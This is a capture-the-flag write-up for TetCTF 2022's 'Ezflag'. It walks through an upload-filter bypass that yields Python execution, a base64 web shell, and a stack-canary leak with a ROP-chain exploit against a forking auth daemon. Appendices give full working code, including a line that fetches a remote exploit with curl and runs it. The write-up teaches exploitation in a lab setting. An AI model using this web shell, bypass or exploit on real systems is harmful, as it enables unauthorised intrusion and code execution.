# Ezflag - TetCTF 2022


# Challenge Description

```
We found an internal storage system exposed to the internet. By ambushing one of the employee, we got some files and the credentials of the system: "admin:admin". Unfortunately, our agent was poisoned and cannot continue hacking. Can you help us?

Service: http://18.220.157.154:9090/
or
Service: http://3.22.71.49:9080/

Author: @nyancat0131
Solves: 47(part1) / 20(part2) / 591
```

# Inspection

We are given the source code of the server files. In `lighttpd.conf` we can see that the server is configured to execute all file with `.py` extension with python3. If we can upload a file with `.py` then we can run anything on the server

```python
$ tail conf/lighttpd.conf
#server.breakagelog = "/var/log/lighttpd/breakage.log"
alias.url += ( "/cgi-bin" => "/var/www/cgi-bin" )
alias.url += ( "/uploads" => "/var/www/upload" )
cgi.assign = ( ".py" => "/usr/bin/python3" )
```



But how do we upload our file?

We know that the server is handled by upload.py. In the `handle_post` function we can see that it takes the file, check the file name is valid, normalized it, then store the file in the upload folder.

```python
def handle_post() -> None:
    fs = cgi.FieldStorage()
    item = fs['file']
    if not item.file:
        write_status(400, 'Bad Request')
        return
    if not valid_file_name(item.filename):
        write_status(400, 'Bad Request')
        return
    normalized_name = item.filename.strip().replace('./', '')
    path = ''.join(normalized_name.split('/')[:-1])
    os.makedirs('../upload/' + path, exist_ok=True)
    with open('../upload/' + normalized_name, 'wb') as f:
        f.write(item.file.read())
    write_location('/uploads/' + normalized_name)
```

The `valid_file_name` function ensures that the file name is a relative path and doesn’t contain `..` nor `.py`. However, since it doesn’t check the file name again after sanitization, we can abuse the sanitization to bypass the filter. By supplying a file with `.p./y` extension, the normalization will remove the `./`from the file name and give us the desire `.py` extension.

Simply upload file with `import os;os.system('cat /flag')` give us the flag.

part 1 flag: `TetCTF{65e95f4eacc1fe7010616e051f1c610a}`

# Persistance

Even though we can execute our own command now, but it’s rather annoying that we need to upload a new file each time we need to execute a new command, therefore I decided to upload a web shell, so I can easily execute command as I wish.

```python
import socket
import base64
import os
cmd = os.environ.get('QUERY_STRING')
os.system(base64.b64decode(cmd))
#curl [server]/uploads/webshell.py?[base64 encoded command]
```

This simple web shell takes a base64 encoded command as it’s query string, execute it, and show it’s result. I later write a simple script to interact it and use it as a shell.

```python
webshell $ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

# One step deeper

From the result above we can see that we are only www-data, and have pretty limited permission. Listing the root directory shows that there is a flag2 file only readable as daemon. From the upload.py file we know that there is a authorization service run on the server run by the daemon. The service seems to be running the auth file that also located in the root directory (results of ps aux also confirms this). I copy the auth file to the upload directory, change the permission, then curl the server from local machine to get the binary to local machine.

```python
webshell $ ls -al /
total 864
drwxr-xr-x   1 root   root     4096 Jan  1 00:06 .
drwxr-xr-x   1 root   root     4096 Jan  1 00:06 ..
-rwxr-xr-x   1 root   root        0 Jan  1 00:06 .dockerenv
-r-xr--r--   1 daemon daemon 802768 Dec 31 22:39 auth
lrwxrwxrwx   1 root   root        7 Oct  6 16:47 bin -> usr/bin
drwxr-xr-x   2 root   root     4096 Apr 15  2020 boot
drwxr-xr-x   5 root   root      340 Jan  1 03:44 dev
drwxr-xr-x   1 root   root     4096 Jan  1 00:06 etc
-r--r--r--   1 root   root       41 Jan  1 00:03 flag
-r--------   1 daemon daemon     41 Jan  1 00:03 flag2
drwxr-xr-x   2 root   root     4096 Apr 15  2020 home
lrwxrwxrwx   1 root   root        7 Oct  6 16:47 lib -> usr/lib
lrwxrwxrwx   1 root   root        9 Oct  6 16:47 lib32 -> usr/lib32
lrwxrwxrwx   1 root   root        9 Oct  6 16:47 lib64 -> usr/lib64
lrwxrwxrwx   1 root   root       10 Oct  6 16:47 libx32 -> usr/libx32
drwxr-xr-x   2 root   root     4096 Oct  6 16:47 media
drwxr-xr-x   2 root   root     4096 Oct  6 16:47 mnt
drwxr-xr-x   2 root   root     4096 Oct  6 16:47 opt
dr-xr-xr-x 995 root   root        0 Jan  1 03:44 proc
drwx------   1 root   root     4096 Jan  1 03:40 root
drwxr-xr-x   1 root   root     4096 Jan  1 00:06 run
-rwxr-xr-x   1   1000   1000    189 Dec 31 15:29 run.sh
lrwxrwxrwx   1 root   root        8 Oct  6 16:47 sbin -> usr/sbin
drwxr-xr-x   2 root   root     4096 Oct  6 16:47 srv
dr-xr-xr-x  13 root   root        0 Jan  1 03:44 sys
drwxrwxrwt   1 root   root     4096 Jan  1 06:57 tmp
drwxr-xr-x   1 root   root     4096 Jan  1 00:05 usr
drwxr-xr-x   1 root   root     4096 Jan  1 00:05 var
webshell $ cp /auth /var/www/uploads/bronson113/auth.bin
webshell $ chmod 777 auth.bin
```

# Vulnerability

In the authorization file, function we are interested locates at 0x0401f10

![Untitled](/img/TetCTF2022-ezflag.png)

We can see that it attempts to copy the received buff onto the stack variable, effectively doing a memcopy on the stack, but since it doesn’t reserve enough space for the buff, we can overflow and control rip. 

# Exploitation

We know that we can control rip by overwriting the return pointer. However stack canary is enabled in this binary, so we need to leak the canary first. Since the service daemon is forking itself for each connection, the layout and canary won’t change between connection, so we just need two connections, one to leak and one to pwn. 

Initially I tried to use the rop chain generated by ropper but it’s too long, and the shell doesn’t pop back through socket. I also realize that the rop chain runs on a different process, therefore we need to do other stuff to get our flag.

I end up constructing a rop chain to call `execve ("/bin/bash",["/bin/bash","-c",cmd],0)` then copy the flag file and change the permission to read it through web shell.

part 2 flag: `TetCTF{cc17b4cd7d2e4cb0af9ef992e472b3ab}`

# Appendix 1 - shell.py

{% capture shell_py %}
```python
import requests
import base64
from pwn import *
ip = ""
webserver_port = 0
def send_cmd(s):
    s = s+";echo a;"
    cmd = base64.b64encode(s.encode()).decode('latin-1')
    payload = f"http://18.191.117.63:9090/uploads/bronson113/webshell.py?{cmd}"
    print(payload)
    r = requests.get(payload)
    if r.text[:9]=="[base64] ":
        print("base64 data:", base64.b64decode(r.text[9:-2]))
    if r.text[:6]== "[exp] ":
        raw_data = base64.b64decode(r.text[6:-2])
        print(f"raw_data: {raw_data}")
        print(','.join(hex(u64(raw_data[i:i+8])) for i in range(8, len(raw_data), 8)))

    else:
        print(r.text[:-2])

while True:
    s = input(">> ").strip()
    if s=="exp":
        send_cmd(f"curl https://{ip}:{webserver_port}/exp.py > local_exp_bronson113_v1.py;python3 local_exp_bronson113_v1.py")
    else:
        send_cmd(s)

#TetCTF{65e95f4eacc1fe7010616e051f1c610a}
```
{% endcapture %}

{% include widgets/toggle-field.html toggle-name="shell_py"
    button-text="Show shell.py" toggle-text=shell_py%}

# Appendix 2 - exp.py

{% capture exp_py %}

```python
import socket
import base64
from struct import pack, unpack
from time import sleep
p = lambda x : pack('Q', x)
u = lambda x : unpack('<Q', x.rjust(8, b'\x00'))

#leak
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('127.0.0.1', 4444))
s.settimeout(5)
s.send(b'admin\nadmin\n')
output = s.recv(256)
leak = output[104:112]
print(hex(u(leak)[0]))
print(leak)
stack_base = u(output[96:104])[0]
print(hex(stack_base))
s.close()

print("finshed_leak")

#exploit
# Generated by ropper ropchain generator #
IMAGE_BASE_0 = 0x0000000000400000 # f52bd202dc2b92d4ca734d1750ac152efd33478a5aec73f7974354784603533f
rebase_0 = lambda x : p(x + IMAGE_BASE_0)

rop = b''

rop += rebase_0(0x000000000000101a) # 0x000000000040101a: ret;
rop += rebase_0(0x00000000000018d1) # 0x00000000004018d1: pop rdi; ret;
rop += p(stack_base-0xa0)
rop += rebase_0(0x000000000000f67e) # 0x000000000040f67e: pop rsi; ret;
rop += p(stack_base-0x28)
rop += rebase_0(0x000000000000176f) # 0x000000000040176f: pop rdx; ret;
rop += p(0x0000000000000000)
rop += rebase_0(0x00000000000497a7) # 0x00000000004497a7: pop rax; ret;
rop += p(0x00000000000003b)
rop += rebase_0(0x0000000000017164) # 0x0000000000417164: syscall; ret;
rop += rebase_0(0x0000000000017164) # 0x0000000000417164: syscall; ret;

print(len(rop))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('127.0.0.1', 4444))
s.settimeout(5)
cmd = b"/bin/bash\x00".ljust(16, b'\x00')
arg1 = b"-c".ljust(8, b'\x00')
#arg2 = b"cp /flag2 /tmp/fl\x00"
arg2 = b"chmod 777 /tmp/fl\x00"
#execve('/bin/bash', ['/bin/bash', '-c', command], 0)
payload = b"\n"+cmd+arg1+leak.rjust(32-(8*3), b'\x00')+rop+p(stack_base-0xa0)+p(stack_base-0x90)+p(stack_base-0x8)+p(0)+arg2+b"\n"
print(len(payload))
s.send(payload)

res = s.recv(256)

s.close()

#TetCTF{cc17b4cd7d2e4cb0af9ef992e472b3ab}
```
{% endcapture %}

{% include widgets/toggle-field.html toggle-name="exp_py"
    button-text="Show exp.py" toggle-text=exp_py%}

